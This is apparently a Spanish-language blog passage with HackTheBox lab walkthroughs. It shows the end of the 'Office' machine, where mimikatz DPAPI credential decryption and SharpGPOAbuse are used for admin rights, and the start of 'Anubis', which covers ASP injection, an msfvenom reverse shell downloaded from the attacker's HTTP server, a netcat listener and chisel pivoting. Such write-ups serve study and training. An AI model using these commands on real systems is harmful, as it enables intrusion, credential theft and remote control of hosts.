<span class="nt">-a-hs-</span>          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
<span class="nt">-a-hs-</span>          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
<span class="nt">-a-hs-</span>         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
</code></pre></div></div>

<ul>
  <li>Después de probar aquí es donde se almacena la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz <span class="c"># dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166</span>
<span class="k">**</span>BLOB<span class="k">**</span>
  dwVersion          : 00000001 - 1
  guidProvider       : <span class="o">{</span>df9d8cd0-1501-11d1-8c7a-00c04fc297eb<span class="o">}</span>
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : <span class="o">{</span>191d3f9d-7959-4b4d-a520-a444853c47eb<span class="o">}</span>
  dwFlags            : 20000000 - 536870912 <span class="o">(</span>system <span class="p">;</span> <span class="o">)</span>
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 <span class="o">(</span>CALG_3DES<span class="o">)</span>
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 <span class="o">(</span>CALG_SHA1<span class="o">)</span>
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 <span class="k">*</span> volatile cache: GUID:<span class="o">{</span>191d3f9d-7959-4b4d-a520-a444853c47eb<span class="o">}</span><span class="p">;</span>KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
 <span class="k">*</span> masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
<span class="k">**</span>CREDENTIAL<span class="k">**</span>
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive<span class="o">=</span>OFFICE<span class="se">\H</span>Hogan
  UnkData        : <span class="o">(</span>null<span class="o">)</span>
  Comment        : <span class="o">(</span>null<span class="o">)</span>
  TargetAlias    : <span class="o">(</span>null<span class="o">)</span>
  UserName       : OFFICE<span class="se">\H</span>Hogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0

mimikatz <span class="c">#</span>
</code></pre></div></div>

<ul>
  <li>Tenemos credenciales <code class="language-plaintext highlighter-rouge">hhogan:H4ppyFtW183#</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> <span class="s1">'hhogan'</span> <span class="nt">-p</span> <span class="s1">'H4ppyFtW183#'</span>
SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\h</span>hogan:H4ppyFtW183#
❯ cme winrm office.htb <span class="nt">-u</span> <span class="s1">'hhogan'</span> <span class="nt">-p</span> <span class="s1">'H4ppyFtW183#'</span>
SMB         office.htb      5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span>
HTTP        office.htb      5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://office.htb:5985/wsman
WINRM       office.htb      5985   DC               <span class="o">[</span>+] office.htb<span class="se">\h</span>hogan:H4ppyFtW183# <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Estamos en el grupo GPO Managers <a href="https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/group-policy/group-policy-management-console">https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/group-policy/group-policy-management-console</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; net user hhogan
User name                    HHogan
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 5:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>Podemos ver los GPOs.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; Get-GPO <span class="nt">-All</span> | Select-Object DisplayName

DisplayName
<span class="nt">-----------</span>
Windows Firewall GPO
Default Domain Policy
Default Active Directory Settings GPO
Default Domain Controllers Policy
Windows Update GPO
Windows Update Domain Policy
Software Installation GPO
Password Policy GPO
</code></pre></div></div>

<ul>
  <li>
    <p>Como el usuario esta en ese grupo puedes editarlos los Group Policy Objects son políticas que Windows utiliza para gestionar computadoras en una red podemos usar esta herramienta <a href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a>.</p>
  </li>
  <li>
    <p>Vamos añadir al usuario actual al grupo de los administradores.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpGPOAbuse.exe <span class="nt">--AddLocalAdmin</span> <span class="nt">--GPOName</span> <span class="s2">"Default Domain Policy"</span> <span class="nt">--UserAccount</span> <span class="s2">"OFFICE</span><span class="se">\h</span><span class="s2">hogan"</span>
<span class="o">[</span>+] Domain <span class="o">=</span> office.htb
<span class="o">[</span>+] Domain Controller <span class="o">=</span> DC.office.htb
<span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>office,DC<span class="o">=</span>htb
<span class="o">[</span>+] SID Value of OFFICE<span class="se">\h</span>hogan <span class="o">=</span> S-1-5-21-1199398058-4196589450-691661856-1108
<span class="o">[</span>+] GUID of <span class="s2">"Default Domain Policy"</span> is: <span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
<span class="o">[</span>+] File exists: <span class="se">\\</span>office.htb<span class="se">\S</span>ysVol<span class="se">\o</span>ffice.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\M</span>icrosoft<span class="se">\W</span>indows NT<span class="se">\S</span>ecEdit<span class="se">\G</span>ptTmpl.inf
<span class="o">[</span>+] The GPO does not specify any group memberships.
<span class="o">[</span>+] versionNumber attribute changed successfully
<span class="o">[</span>+] The version number <span class="k">in </span>GPT.ini was increased successfully.
<span class="o">[</span>+] The GPO was modified to include a new <span class="nb">local </span>admin. Wait <span class="k">for </span>the GPO refresh cycle.
<span class="o">[</span>+] Done!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
</code></pre></div></div>

<ul>
  <li>Ahora comprobamos que estamos dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; net user hhogan
User name                    HHogan
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 5:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>Si nos volvemos a conectar ya podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> office.htb <span class="nt">-u</span> <span class="s1">'hhogan'</span> <span class="nt">-p</span> <span class="s1">'H4ppyFtW183#'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
a765138dbb01ba1b3773f22129fe1f3a
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Anubis (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html" rel="alternate" type="text/html" title="HackTheBox - Anubis (insane)" /><published>2024-07-14T00:00:00-06:00</published><updated>2024-07-14T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/3a460ae7ce41664384f83e3d6e2c7650.png" />
</p>

<ul>
  <li>Anubis is an insane difficulty Windows machine that showcases how a writable certificate template in the Windows Public Key Infrastructure can lead to the escalation of privileges to Domain Administrator in an Active Directory environment. An interactive shell on a Windows container can be obtained by exploiting a simple ASP code injection vulnerability in a public-facing web application. Pivoting from the initial shell, further access is gained to an internal web application that can be tricked into sending requests to an attacker-controlled Responder server, allowing to steal valid domain credentials that can be used to access an internal SMB share where malicious Jamovi files can be uploaded, resulting in a shell on the Windows host. After adding the smart card logon extended usage attribute to an available certificate template and requesting a new client certificate, PKINIT can be configured on an attacking Linux machine to request a Kerberos ticket and login to the system as Administrator.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> ../nmap/targeted
<span class="c"># Nmap 7.94SVN scan initiated Fri Jul 12 17:35:12 2024 as: nmap -sCV -p135,443,445,593,49694 -oN targeted 10.10.11.102</span>
Nmap scan report <span class="k">for </span>10.10.11.102
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-07-12T23:45:55+00:00<span class="p">;</span> +8m51s from scanner time.
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Not valid before: 2021-05-24T19:44:56
|_Not valid after:  2031-05-24T19:54:56
|_http-title: Not Found
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8m52s, deviation: 2s, median: 8m50s
| smb2-time:
|   <span class="nb">date</span>: 2024-07-12T23:45:23
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>No podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">RPC</code> de momento.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.102
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Vemos el nombre del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar los nombres al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb
</code></pre></div></div>

<ul>
  <li>No vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/1.png" />
</p>

<ul>
  <li>Si analizamos el escaneo de <strong>Nmap</strong> vemos un subdominio pero si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> vemos que también existe.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-07-12T23:45:55+00:00<span class="p">;</span> +8m51s from scanner time.
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.windcorp.htb"</span> <span class="nt">-u</span> https://windcorp.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://windcorp.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1007 L   3245 W     46774 Ch    "www"
</span></code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb www.windcorp.htb
</code></pre></div></div>

<ul>
  <li>Ahora si nos carga una pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/2.png" />
</p>

<ul>
  <li>Al no haber nada interesante en la página web vamos a probar con la parte de <code class="language-plaintext highlighter-rouge">contact</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/3.png" />
</p>

<ul>
  <li>Vemos que la extensión es <code class="language-plaintext highlighter-rouge">.asp</code> <a href="https://www.dommia.com/es/faqs/que-es-asp">https://www.dommia.com/es/faqs/que-es-asp</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/4.png" />
</p>

<ul>
  <li>Vemos que corre un <code class="language-plaintext highlighter-rouge">IIS</code> <a href="https://blog.infranetworking.com/servidor-iis/">https://blog.infranetworking.com/servidor-iis/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb https://www.windcorp.htb/preview.asp
https://www.windcorp.htb/preview.asp <span class="o">[</span>200 OK] ASP_NET, Bootstrap, Cookies[ASPSESSIONIDSEAQBQCA], Country[RESERVED][ZZ], Email[contact@windcorp.htb,test@test.com], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Microsoft-IIS[10.0]
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos inyectar código <code class="language-plaintext highlighter-rouge">asp</code> en la parte del <code class="language-plaintext highlighter-rouge">message</code> <a href="https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html">https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html</a>.</p>
  </li>
  <li>
    <p>Vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">whoami</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/5.png" />
</p>

<ul>
  <li>
    <p>Vemos que estamos como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
  </li>
  <li>
    <p>Vamos a ganar acceso a la máquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom <span class="nt">-p</span> windows/x64/powershell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.74 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1887 bytes
Final size of exe file: 8192 bytes
Saved as: shell.exe
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutar un servidor <code class="language-plaintext highlighter-rouge">http</code> en <code class="language-plaintext highlighter-rouge">python3</code> para compartir el <code class="language-plaintext highlighter-rouge">.exe</code> y descargarlo en la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora empleando la misma <code class="language-plaintext highlighter-rouge">query</code> que usamos para ejecutar <code class="language-plaintext highlighter-rouge">whoami</code> vamos a cambiar el comando para descargar el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/6.png" />
</p>

<ul>
  <li>Una vez nos llega la petición sabemos que se descargo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.102 - - <span class="o">[</span>14/Jul/2024 12:29:42] <span class="s2">"GET /shell.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ponernos en escucha para hacer la petición y recibir la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Al darle a <code class="language-plaintext highlighter-rouge">send</code> y a Yes nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/7.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 49862
Windows PowerShell running as user WEBSERVER01<span class="nv">$ </span>on WEBSERVER01
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.


PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem
PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<h2 id="shell-as-localadmin">Shell as localadmin</h2>

<ul>
  <li>Estamos en un contenedor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; ipconfig

Windows IP Configuration


Ethernet adapter vEthernet <span class="o">(</span>Ethernet<span class="o">)</span>:

   Connection-specific DNS Suffix  <span class="nb">.</span> :
   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::706d:5871:4a4e:eeae%32
   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.31.91.26
   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.240.0
   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.31.80.1
</code></pre></div></div>

<ul>
  <li>Vemos un certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">cd  </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        5/24/2021   9:36 PM            989 req.txt


PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>req.txt
<span class="nt">-----BEGIN</span> CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
<span class="nv">4TlwpQ</span><span class="o">==</span>
<span class="nt">-----END</span> CERTIFICATE REQUEST-----
</code></pre></div></div>

<ul>
  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">openssl</code> podemos ver información sobre el certificado y encontramos un subdominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ openssl req <span class="nt">-in</span> req.txt <span class="nt">-text</span> <span class="nt">-noout</span>
Certificate Request:
    Data:
        Version: 1 <span class="o">(</span>0x0<span class="o">)</span>
        Subject: <span class="nv">C</span><span class="o">=</span>AU, <span class="nv">ST</span><span class="o">=</span>Some-State, <span class="nv">O</span><span class="o">=</span>WindCorp, <span class="nv">CN</span><span class="o">=</span>softwareportal.windcorp.htb
</code></pre></div></div>

<ul>
  <li>De primero no podremos ver el contenido por que no estamos en la máquina real entonces vamos agregar el subdominio con la <code class="language-plaintext highlighter-rouge">ip</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para después hacer <code class="language-plaintext highlighter-rouge">pivoting</code> y ver el contenido de la web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"172.31.80.1 softwareportal.windcorp.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
172.31.80.1 softwareportal.windcorp.htb
</code></pre></div></div>

<ul>
  <li>Ahora haremos un túnel con <code class="language-plaintext highlighter-rouge">chisel</code> para poder el contenido del subdominio <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">--port</span> 7777
2024/07/14 12:52:12 server: Reverse tunnelling enabled
2024/07/14 12:52:12 server: Fingerprint <span class="nv">hQlhzIeg9gPeaeLFyYcqON7asMg19ni17iUMIiEN7L0</span><span class="o">=</span>
2024/07/14 12:52:12 server: Listening on http://0.0.0.0:7777
</code></pre></div></div>

<ul>
  <li>Ahora corremos el chisel en la máquina victima.</li>
